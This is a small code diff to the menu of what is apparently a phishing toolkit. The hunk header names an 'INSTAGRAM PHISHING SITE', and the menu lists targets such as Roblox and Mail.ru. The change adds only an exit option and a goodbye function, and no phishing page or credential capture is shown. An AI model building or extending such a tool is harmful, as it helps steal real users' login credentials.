@@ -26,6 +26,8 @@ INSTAGRAM PHISHING SITE:
     else:
         print("Please,choose correct option!")
 
+def break_funk():
+    print("BYE!")
 
 def main():
     print("""                       
@@ -46,7 +48,7 @@ def main():
     [7] -- Roblox                                                   ▀▄▀▒▒▌▒▒▄▀░▌█▐░░▐▐▀░░░▌█▐░▀▄▐▒▌▌░░░▀
     [8] -- Mail.ru                                                  ░▀▀▄▄▐▒▀▄▀░▀▄▀░░░░░░░░▀▄▀▄▀▒▌░▐
                                                                     ░░░░▀▐▀▄▒▀▄░░░░░░░░▐░░░░░░▀▌▐
-                                                                    ░░░░░░▌▒▌▐▒▀░░░░░░░░░░░░░░▐▒▐
+                         [0] -- EXIT!                               ░░░░░░▌▒▌▐▒▀░░░░░░░░░░░░░░▐▒▐
                                                                     ░░░░░░▐░▐▒▌░░░░▄▄▀▀▀▀▄░░░░▌▒▐
                                                                     ░░░░░░░▌▐▒▐▄░░░▐▒▒▒▒▒▌░░▄▀▒░▐
                                                                     ░░░░░░▐░░▌▐▐▀▄░░▀▄▄▄▀░▄▀▐▒░░▐
@@ -58,6 +60,9 @@ def main():
         hacker = input("Enter option: ")
         if hacker == "1":
             instagram_menu()
+            break
+        elif hacker == "0":
+            break_funk()
             break
         else:
             print("""            
